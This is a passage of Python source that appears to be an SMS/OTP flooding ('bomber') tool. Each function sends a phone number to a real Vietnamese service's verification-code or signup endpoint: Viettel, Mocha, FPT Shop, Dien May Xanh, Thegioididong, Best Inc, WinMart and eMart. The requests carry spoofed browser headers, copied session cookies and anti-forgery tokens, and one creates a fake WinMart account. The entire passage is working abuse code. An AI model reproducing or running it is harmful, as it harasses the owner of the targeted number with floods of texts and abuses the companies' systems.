        'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IkQ4REdsTHI2YmNCK1QwdTJqWXRsUFE9PSIsInZhbHVlIjoiQ1VGdmZTZEJvajBqZWFPVWVLaGFabDF1cWtSMjhVNGJMNSszbDhnQ1k1RTZMdkRcL29iVzZUeDVyNklFRGFRRlAiLCJtYWMiOiIxYmI0MzNlYjE2NWU0NDE1NDUwMDA3MTE1ZjI2ODAxYjgzMjg1NDFhMzA0ODhiMmU1YjQ1ZjQxNWU3ZDM1Y2Y5In0=',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://viettel.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)

def mocha(phone):
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    params = {
    'msisdn': phone,
    'languageCode': 'vi',
}

    response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
def fptshop(phone):
    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://fptshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://fptshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'fromSys': 'WEBKHICT',
    'otpType': '0',
    'phoneNumber': phone,
}

    response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
def blu(phone):
    cookies = {
    'DMX_View': 'DESKTOP',
    'DMX_Personal': '%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d',
    '_gcl_au': '1.1.804133484.1690973397',
    '_gid': 'GA1.2.1071358409.1690973397',
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_id.8.8977': 'c624660949009f11.1690973398.',
    '_pk_ses.8.8977': '1',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1',
    'cebs': '1',
    '_ce.s': 'v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116',
    '_fbp': 'fb.1.1690973400267.315266557',
    '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU',
    '_ce.clock_event': '1',
    '_ce.clock_data': '-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0',
    'lhc_per': 'vid|c3330ef02699a3239f3d',
    '_gat_UA-38936689-1': '1',
    '_ga_Y7SWKJEHCE': 'GS1.1.1690973397.1.1.1690973847.59.0.0',
    '_ga': 'GA1.1.1906131468.1690973397',
    'SvID': 'dmxcart2737|ZMo2n|ZMo01',
    'cebsp_': '2',
}

    headers = {
    'authority': 'www.dienmayxanh.com',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'DMX_View=DESKTOP; DMX_Personal=%7b%22UID%22%3a%2269da67e91306625b7e4461b2d726d53e84bdc049%22%2c%22ProvinceId%22%3a3%2c%22Culture%22%3a%22vi-3%22%2c%22Lat%22%3a0.0%2c%22Lng%22%3a0.0%2c%22DistrictId%22%3a0%2c%22WardId%22%3a0%2c%22CRMCustomerId%22%3anull%2c%22CustomerSex%22%3a-1%2c%22CustomerName%22%3anull%2c%22CustomerPhone%22%3anull%2c%22CustomerEmail%22%3anull%2c%22CustomerIdentity%22%3anull%2c%22CustomerBirthday%22%3anull%2c%22CustomerAddress%22%3anull%2c%22IsDefault%22%3atrue%7d; _gcl_au=1.1.804133484.1690973397; _gid=GA1.2.1071358409.1690973397; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1690973398%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.8.8977=c624660949009f11.1690973398.; _pk_ses.8.8977=1; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXariFZ7h0kQ3U5Gs8UiAnwDyJ1ynznRhbtnOAm3G.1; cebs=1; _ce.s=v~6debca02172f8c79be6e07c78168d43c57db52d6~lcw~1690973400113~vpv~0~lcw~1690973400116; _fbp=fb.1.1690973400267.315266557; .AspNetCore.Antiforgery.UMd7_MFqVbs=CfDJ8Btx1b7t0ERJkQbRPSImfvKFVk5UxirK_DlUQuqJOBk33uvWuB3H3sLskY2bzhJULvBSo4FDv0B-QoElmnSUITEaiP7A5pf5u_-RRIc4q2BrvTs5VrpEf5qng-OVNYSollI8A9AmTXlvZHkimnAqouU; _ce.clock_event=1; _ce.clock_data=-747%2C27.72.61.29%2C1%2C15c2f6f9416d00cec8b4f729460293c0; lhc_per=vid|c3330ef02699a3239f3d; _gat_UA-38936689-1=1; _ga_Y7SWKJEHCE=GS1.1.1690973397.1.1.1690973847.59.0.0; _ga=GA1.1.1906131468.1690973397; SvID=dmxcart2737|ZMo2n|ZMo01; cebsp_=2',
    'origin': 'https://www.dienmayxanh.com',
    'referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8Btx1b7t0ERJkQbRPSImfvIRzWBz3HYz5v5BqsZBR9c1E2ww7q_1JGohDXjcRDM1kdeAbuyRu9P0s0XFTPbkk43itS19oUg6iD6CroYe4kX3wq5d8C1R5pfyfCr1uXg2ZI5cgkU7CkZOa4xBIZIW_k0',
}
 
    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)
def tgdt(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_gcl_au': '1.1.1121422736.1720077126',
    '_ga': 'GA1.1.304095547.1720077127',
    '_pk_id.8.8977': 'f4065ec429abd1e2.1720077127.',
    '_ce.clock_data': '-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    '_fbp': 'fb.1.1720077128189.217218927440922861',
    'TBMCookie_3209819802479625248': '350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.8.8977': '1',
    'SvID': 'new2688|Zoaz1|Zoaz0',
    '_ce.irv': 'returning',
    'cebs': '1',
    '.AspNetCore.Antiforgery.SuBGfRYNAsQ': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI',
    'cebsp_': '2',
    '_ga_Y7SWKJEHCE': 'GS1.1.1720103888.2.1.1720103890.58.0.0',
    '__zi': '3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1',
    '_ce.s': 'v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _gcl_au=1.1.1121422736.1720077126; _ga=GA1.1.304095547.1720077127; _pk_id.8.8977=f4065ec429abd1e2.1720077127.; _ce.clock_data=-1077%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; _fbp=fb.1.1720077128189.217218927440922861; TBMCookie_3209819802479625248=350434001720103887HQtfwlkQ8p9eEkPF0VqAsJGOzLs=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _pk_ref.8.8977=%5B%22%22%2C%22%22%2C1720103889%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.8.8977=1; SvID=new2688|Zoaz1|Zoaz0; _ce.irv=returning; cebs=1; .AspNetCore.Antiforgery.SuBGfRYNAsQ=CfDJ8LmkDaXB2QlCm0k7EtaCd5T-BVfrQtN_TjNsXHYUv3dyiopPyuZRrVU2wwbf3Jt-RZ2tfLfDJ4CYbWQhoQ0R_6DkOIHIwOIMD6pGO2uj79ZOLK3ObjH-8tmBDAn1x-pbePiOu-s5CXh2T6QLp_mMoaI; cebsp_=2; _ga_Y7SWKJEHCE=GS1.1.1720103888.2.1.1720103890.58.0.0; __zi=3000.SSZzejyD7DSkXFIgmniGs3_Izgl65r-L8fpuiuLBJPyzZhgXareEYNh1kApT7mk2UCw_ujqV2SP_oRJltHe4oZG.1; _ce.s=v~ee3ce10ae5283530e576b6af80819668ef23331c~lcw~1720103896357~lva~1720103889638~vpv~1~v11.cs~218102~v11.s~08b51710-3a13-11ef-bb9c-bd4200118138~v11.sla~1720103896355~gtrk.la~ly7dg4v0~lcw~1720103896476",
    'Origin': 'https://www.dienmayxanh.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8LmkDaXB2QlCm0k7EtaCd5Twguyex9_cgh9XeukD7bUARFjQSniZ-oK2sROjdYE3ySLrvJztUU-tZn-ZBnL8wqLJjlGTji6qBtWGJDVYPGVt0U3RgoB0Q2Grd4i24dkz4TUIRjXBHguoShv3oZjAt2s',
}

    response = requests.post(
    'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

def concung(phone):
    cookies = {
    'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D',
    '_pk_id.7.8f7e': '26368263202a729d.1690741327.',
    '_fbp': 'fb.1.1690741326923.344831016',
    '_tt_enable_cookie': '1',
    '_ttp': '4ISzilNrZxHb4rxPiS6GakGBcBl',
    'TBMCookie_3209819802479625248': '256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=',
    '___utmvm': '###########',
    '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    '_gcl_au': '1.1.584652992.1720103764',
    'SvID': 'beline2685|ZoazW|ZoazV',
    '_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
    '_pk_ses.7.8f7e': '1',
    '.AspNetCore.Antiforgery.Pr58635MgNE': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs',
    '_ga': 'GA1.2.1745564613.1690741327',
    '_gid': 'GA1.2.530012217.1720103766',
    '_gat': '1',
    '_ce.irv': 'returning',
    'cebs': '1',
    '_ga_TZK5WPYMMS': 'GS1.2.1720103766.6.0.1720103766.60.0.0',
    '_ga_TLRZMSX5ME': 'GS1.1.1720103764.33.1.1720103766.58.0.0',
    '__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1',
    '_ce.clock_data': '-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN',
    'cebsp_': '1',
    '_ce.s': 'v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571',
}

    headers = {
    'Accept': '*/*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': "DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%7D; _pk_id.7.8f7e=26368263202a729d.1690741327.; _fbp=fb.1.1690741326923.344831016; _tt_enable_cookie=1; _ttp=4ISzilNrZxHb4rxPiS6GakGBcBl; TBMCookie_3209819802479625248=256783001720103762EqkLWbY41pHbZLmofZhYIMXUU7I=; ___utmvm=###########; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.584652992.1720103764; SvID=beline2685|ZoazW|ZoazV; _pk_ref.7.8f7e=%5B%22%22%2C%22%22%2C1720103765%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.7.8f7e=1; .AspNetCore.Antiforgery.Pr58635MgNE=CfDJ8AFHr2lS7PNCsmzvEMPceBMCyLI0SVSaDSpDzEt7c6CGCXKntCHv_9RxrtvtDK2AJgoOhTMujYstZ1JQlXX1KSIsK5Xrm8FKNYtGX-fIJ5AA650hlmDqcMk3EgiLr_dsuk-ZGFU0r-5zKj768mbpHEs; _ga=GA1.2.1745564613.1690741327; _gid=GA1.2.530012217.1720103766; _gat=1; _ce.irv=returning; cebs=1; _ga_TZK5WPYMMS=GS1.2.1720103766.6.0.1720103766.60.0.0; _ga_TLRZMSX5ME=GS1.1.1720103764.33.1.1720103766.58.0.0; __zi=3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJd3RMg_oH21tPCzsfyvP67TancQxqdKiTt3KvD0.1; _ce.clock_data=-186%2C1.52.175.136%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CVN; cebsp_=1; _ce.s=v~9800580d0168e8ee43b962e2f7f781d34682b85f~lcw~1720103774343~vpv~24~lva~1720103765900~v11slnt~1712503853696~v11.cs~127806~v11.s~bfab1f60-3a12-11ef-9d92-dbe9f22de209~v11.sla~1720103774571~lcw~1720103774571",
    'Origin': 'https://www.thegioididong.com',
    'Pragma': 'no-cache',
    'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    data = {
    'phoneNumber': phone,
    'isReSend': 'false',
    'sendOTPType': '1',
    '__RequestVerificationToken': 'CfDJ8AFHr2lS7PNCsmzvEMPceBMG5vy2Ok1mvC8SbvlKgWIOz2Y3oc5DTGZxHd9t5Hsux7Fa-HK_oS6VsTyiSM9I--XIfDq9NA1NYxg9q87YfcUjoav9khceFwpr0rM5aRgoR-ivz9IHBVr9ZIWxqNXtMWE',
}

    response = requests.post(
    'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
    cookies=cookies,
    headers=headers,
    data=data,
)

def best_inc(phone):
    headers = {
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    'Origin': 'https://www.best-inc.vn',
    'Referer': 'https://www.best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-auth-type': 'WEB',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}

    json_data = {
    'phoneNumber': phone,
    'verificationCodeType': 1,
}

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)

def winmart(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer undefined',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://winmart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://winmart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-api-merchant': 'WCM',
}

    json_data = {
    'firstName': 'Taylor Jasmine',
    'phoneNumber': phone,
    'masanReferralCode': '',
    'dobDate': '2005-08-05',
    'gender': 'Male',
}

    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)

def emart(phone):
    cookies = {
    'emartsess': 'gmdbftq46lqooc1s5iv9l7nsn0',
    'default': 'e6ec14ce933f55f7f1a9bb7355',
    'language': 'vietn',
    'currency': 'VND',
    '_fbp': 'fb.2.1691143292627.1008340188',
    '_gid': 'GA1.3.332853186.1691143293',
    '_gat_gtag_UA_117859050_1': '1',
    '_ga_ZTB26JV4YJ': 'GS1.1.1691143293.1.1.1691143433.0.0.0',
    '_ga': 'GA1.1.736434119.1691143293',
}

    headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'emartsess=gmdbftq46lqooc1s5iv9l7nsn0; default=e6ec14ce933f55f7f1a9bb7355; language=vietn; currency=VND; _fbp=fb.2.1691143292627.1008340188; _gid=GA1.3.332853186.1691143293; _gat_gtag_UA_117859050_1=1; _ga_ZTB26JV4YJ=GS1.1.1691143293.1.1.1691143433.0.0.0; _ga=GA1.1.736434119.1691143293',
